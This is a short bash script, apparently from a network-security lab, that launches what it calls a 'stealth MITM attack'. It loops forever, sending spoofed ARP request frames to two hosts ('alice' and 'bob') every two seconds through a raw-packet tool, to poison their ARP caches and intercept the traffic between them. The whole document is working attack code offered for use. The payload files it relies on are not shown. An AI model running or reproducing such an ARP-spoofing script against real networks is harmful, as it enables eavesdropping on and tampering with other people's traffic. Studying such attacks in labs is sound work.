#!/bin/bash
echo "Starting STEALTH MITM Attack (Requests)..."
while true; do
    # Send ARP Requests (Opcode 1) instead of Replies
    sudo raw_packet eth1 02:42:0a:0a:31:02 0x0806 stealth_alice
    sudo raw_packet eth1 02:42:0a:0a:31:03 0x0806 stealth_bob
    sleep 2
done
